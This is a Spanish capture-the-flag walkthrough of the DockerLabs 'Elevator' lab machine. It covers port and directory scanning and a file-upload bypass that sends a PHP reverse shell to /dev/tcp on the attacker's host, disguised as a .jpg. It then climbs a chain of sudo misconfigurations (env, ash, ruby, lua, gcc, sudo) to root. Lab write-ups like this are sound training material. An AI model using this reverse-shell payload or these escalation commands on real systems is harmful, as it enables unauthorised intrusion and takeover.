#MAQUINA #DOCKERLABS #FACIL 
#ABUSO_SUBIDA_ARCHIVOS 
#BURPSUITE 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Elevator** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-03 13:44 CET
Initiating ARP Ping Scan at 13:44
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 13:44, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:44
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 13:44, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-03 13:44:06 CET for 0s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 172.17.0.2                         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-03 13:45 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000028s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: El Ascensor Embrujado - Un Misterio de Scooby-Doo
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.43 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-03 13:45 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)
Al revisar la web que hay en el puerto 80, vemos que parece no haber nada interesante, vamos a enumerar bien con gobuster : 

   ```bash

gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,html,php,js,txt,png
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.png                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/.js                  (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 5647]
/themes               (Status: 301) [Size: 309] [--> http://172.17.0.2/themes/]
/.txt                 (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/.jpg                 (Status: 403) [Size: 275]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/Template             (Status: 403) [Size: 275]
/Repository           (Status: 403) [Size: 275]
/.png                 (Status: 403) [Size: 275]
/.jpg                 (Status: 403) [Size: 275]
/.txt                 (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/.js                  (Status: 403) [Size: 275]
/Tag                  (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================



```

Parece no haber mucho y los directorios **themes** y **javascript** no podemos listarlos desde la web (no tenemos permisos), vamos a enumerarlos con gobuster :

   ```bash

gobuster dir -u http://172.17.0.2/themes/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/themes/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,txt,png,jpg,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.jpg                 (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/.png                 (Status: 403) [Size: 275]
/.txt                 (Status: 403) [Size: 275]
/.js                  (Status: 403) [Size: 275]
/uploads              (Status: 301) [Size: 317] [--> http://172.17.0.2/themes/uploads/]
/upload.php           (Status: 200) [Size: 0]
/Template             (Status: 403) [Size: 275]
/archivo.html         (Status: 200) [Size: 3380]
/Repository           (Status: 403) [Size: 275]
/.png                 (Status: 403) [Size: 275]
/.jpg                 (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/.js                  (Status: 403) [Size: 275]
/.txt                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/Tag                  (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================

```

**Conclusiones:** 
+ Tenemos un **archivo.html** que usando **upload.php** nos permite subir archivos a **uploads**.
+ Podemos ver las subidas a **uploads** y seguramente se interpreten ya que interpreta php
+ Solo permite **jpg**

# EXPLOTACION

Con **burpsuite** interceptamos el envío de un php nuestro y le cambiamos la extensión a jpg: 

   ```bash

POST /themes/upload.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------25809358041701007273769940861
Content-Length: 473
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/themes/archivo.html
Cookie: JSESSIONID.1ffb2965=node01ntkucnv7iw0012wdyrveal5x4462.node0
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------25809358041701007273769940861
Content-Disposition: form-data; name="file"; filename="wp.jpg"
Content-Type: application/x-php

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

-----------------------------25809358041701007273769940861--


```

Mientras nos ponemos en escucha por el puerto 443 (**nc -nlvp 443**)

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
www-data@32bb9201378f:/var/www/html/themes/uploads$ sudo -l
Matching Defaults entries for www-data on 32bb9201378f:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on 32bb9201378f:
    (daphne) NOPASSWD: /usr/bin/env
```

Vemos **env** con permisos SUDO :
   ```bash
www-data@32bb9201378f:/var/www/html/themes/uploads$ sudo -u daphne env /bin/bash
```

YA ESTAMOS COMO DAPHNE.

Vemos si el usuario tiene permisos SUDO:
   ```bash
daphne@32bb9201378f:/$ sudo -l
Matching Defaults entries for daphne on 32bb9201378f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User daphne may run the following commands on 32bb9201378f:
    (vilma) NOPASSWD: /usr/bin/ash
```

Vemos **ash** con permisos SUDO :
   ```bash
daphne@32bb9201378f:/$ sudo -u vilma /usr/bin/ash
$ whoami
vilma
```

YA ESTAMOS COMO VILMA.

Vemos si el usuario tiene permisos SUDO:
   ```bash
$ sudo -l
Matching Defaults entries for vilma on 32bb9201378f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User vilma may run the following commands on 32bb9201378f:
    (shaggy) NOPASSWD: /usr/bin/ruby

```

Vemos **ruby** con permisos SUDO :
   ```bash
vilma@32bb9201378f:/$ sudo -u shaggy ruby -e 'exec "/bin/sh"'
                             
$ whoami                     
shaggy
```

YA ESTAMOS COMO SHAGGY.

Vemos si el usuario tiene permisos SUDO:
   ```bash
shaggy@32bb9201378f:/$ sudo -l
Matching Defaults entries for shaggy on 32bb9201378f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User shaggy may run the following commands on 32bb9201378f:
    (fred) NOPASSWD: /usr/bin/lua
```

Vemos **lua** con permisos SUDO :
   ```bash
shaggy@32bb9201378f:/$       sudo -u fred lua -e 'os.execute("/bin/sh")'  
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
fred@32bb9201378f:/$  
```

YA ESTAMOS COMO FRED.

Vemos si el usuario tiene permisos SUDO:
   ```bash
fred@32bb9201378f:/$ sudo -l
Matching Defaults entries for fred on 32bb9201378f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User fred may run the following commands on 32bb9201378f:
    (scooby) NOPASSWD: /usr/bin/gcc
```

Vemos **gcc** con permisos SUDO :
   ```bash
fred@32bb9201378f:/$       sudo -u scooby gcc -wrapper /bin/sh,-s .  
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
scooby@32bb9201378f:/$ 
```

YA ESTAMOS COMO SCOOBY.

Vemos si el usuario tiene permisos SUDO:
   ```bash
scooby@32bb9201378f:/$ sudo -l
Matching Defaults entries for scooby on 32bb9201378f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User scooby may run the following commands on 32bb9201378f:
    (root) NOPASSWD: /usr/bin/sudo
```

Vemos **sudo** con permisos SUDO :
   ```bash
scooby@32bb9201378f:/$ sudo sudo bash -p
root@32bb9201378f:/# whoami
root
root@32bb9201378f:/# 
```

**YA ESTAMOS COMO ROOT.**